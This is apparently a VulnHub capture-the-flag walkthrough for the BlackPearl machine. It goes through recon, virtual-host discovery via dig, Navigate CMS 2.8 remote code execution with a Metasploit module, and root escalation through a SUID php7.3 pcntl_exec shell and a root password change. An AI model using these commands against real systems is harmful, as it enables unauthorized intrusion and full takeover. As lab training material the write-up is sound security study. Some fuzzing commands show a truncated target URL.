# VulnHub Walkthrough: BlackPearl

* **Target:** BlackPearl (VulnHub)
* **Target IP:** `10.0.2.24`
* **Attacker IP:** `10.0.2.16`
* **OS:** Debian GNU/Linux 10
* **Techniques Used:** Host Discovery (`netdiscover`), Port Scanning (`nmap`), Web Fuzzing (`ffuf`), Reverse DNS Lookup (`dig`), Virtual Host Routing, Navigate CMS v2.8 RCE (`msfconsole`), SUID Binary Privilege Escalation (`php7.3`)

---

## 1. Reconnaissance & Host Discovery

First, I checked my attacker IP address (`10.0.2.16`) using `ifconfig` and scanned the local `10.0.2.0/24` subnet with `netdiscover` to locate the target machine.

```bash
ifconfig
sudo netdiscover -r 10.0.2.0/24
```
<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/e1ee74c5-31c2-4be0-a9b8-dfb1269bd16e" />


### Port Scanning
`netdiscover` identified two active hosts (`10.0.2.15` and `10.0.2.24`). Running `nmap` against `10.0.2.24` revealed three open ports:

```bash
nmap 10.0.2.24
```

* **22/tcp:** SSH
* **53/tcp:** DNS (`domain`)
* **80/tcp:** HTTP (`nginx`)

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/5019b570-90a5-451d-bb16-d86ad917fd95" />

---

## 2. Web & DNS Enumeration

### Initial Web Check & Directory Fuzzing
Navigating to `http://10.0.2.24` in the browser returned a default **"Welcome to nginx!"** placeholder page.

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/f7cb7eb0-e3b9-4eef-ba87-680dee9bfd1c" />



I ran `ffuf` using `directory-list-2.3-medium.txt` to fuzz for hidden directories on the raw IP, which uncovered `/secret`.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2 -ic
```

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/229f5401-1be6-41ad-94b4-976e96d44d98" />


Visiting `http://10.0.2` downloaded a text file containing a rabbit-hole message from the creator (`- Alek`), hinting that directory busting on the IP wouldn't yield results and to look elsewhere.

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/8d07d6eb-92ea-4380-b58b-06c77eaf3bbf" />



### Reverse DNS Lookup
Since port **53 (DNS)** was open on the target, I performed a reverse DNS query against `10.0.2.24` for localhost (`127.0.0.1`) using `dig`, which revealed the virtual host domain name: **`blackpearl.tcm`**.

```bash
dig @10.0.2.24 -x 127.0.0.1
```

<img width="1418" height="930" alt="image" src="https://github.com/user-attachments/assets/ae3865cf-69b8-4c0d-b591-0f434552702c" />


I added `10.0.2.24 blackpearl.tcm` to `/etc/hosts` on my Kali machine so the browser and tools could resolve the virtual host.

### Virtual Host Directory Fuzzing
Running `ffuf` against `http://blackpearl.tcm` discovered the `/navigate` directory (`Status: 301`).

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blackpearl.tcm -ic
```

<img width="2774" height="1006" alt="image" src="https://github.com/user-attachments/assets/9c0fa2d1-7d4c-4173-8010-02d6686480bb" />


Navigating to `http://blackpearl.tcm` confirmed the target was running **Navigate CMS v2.8**.

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/73718f70-b797-4f5f-9aaa-abace385571e" />

---

## 3. Exploitation (Initial Access)

I launched `msfconsole` and loaded the unauthenticated Remote Code Execution module for Navigate CMS (`exploit/multi/http/navigate_cms_rce`).

```text
use exploit/multi/http/navigate_cms_rce
options
```

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/b7a2e5a5-0783-48db-b4cb-82863e3960fe" />


I configured `RHOSTS` to the target IP, set `VHOST` to `blackpearl.tcm` so nginx routed the request properly, set `LPORT` to `55`, and ran the exploit. After getting a Meterpreter session as `www-data`, I spawned an interactive bash shell with Python:

```text
set VHOST blackpearl.tcm
set RHOSTS 10.0.2.24
set LPORT 55
run
```

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="2940" height="1912" alt="image" src="https://github.com/user-attachments/assets/a3716a73-640e-4dec-81d5-52c651936cd1" />

---

## 4. Privilege Escalation

To find privilege escalation vectors, I searched the filesystem for binaries with the SUID permission bit set:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/php7.3` appeared in the SUID list. Using GTFOBins, I executed `/bin/sh -p` via PHP's `pcntl_exec` function to retain elevated privileges, achieving `euid=0(root)`:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
id
whoami
```

<img width="1670" height="938" alt="image" src="https://github.com/user-attachments/assets/92f8dcaa-7580-4fe1-a7da-ea99a846748f" />


---

## 5. Post-Exploitation & Flag

To upgrade to a full root UID (`uid=0`) and establish direct console access on the VM, I executed a Python `setuid(0)` shell and updated the `root` user password:

```bash
cd /root
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
passwd root
```

<img width="1244" height="412" alt="image" src="https://github.com/user-attachments/assets/794775ab-c818-4c16-8634-615cbd4f05c5" />


Reading `/root/flag.txt` revealed the final completion message:

```bash
ls
cat flag.txt
```

> *"Good job on this one. Finding the domain name may have been a little guessy, but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF."*

<img width="2192" height="318" alt="image" src="https://github.com/user-attachments/assets/fff8a3d8-afe1-44b7-87a7-a007ed425b6f" />


Finally, I verified direct login access as `root` on the target's `tty1` console screen.

<img width="1460" height="752" alt="image" src="https://github.com/user-attachments/assets/33d30ad2-8864-45ce-b496-b07ed2baeb4d" />


---

## Key Takeaways
* **Always Check DNS & Virtual Hosts:** When an IP serves a default web server page and directory brute-forcing leads to dead ends, enumerate DNS records (`dig`) and inspect headers/source code for virtual host domains.
* **Insecure SUID Permissions:** Allowing interpreters like `/usr/bin/php7.3` to run with the SUID bit enabled creates an immediate path to full root compromise.
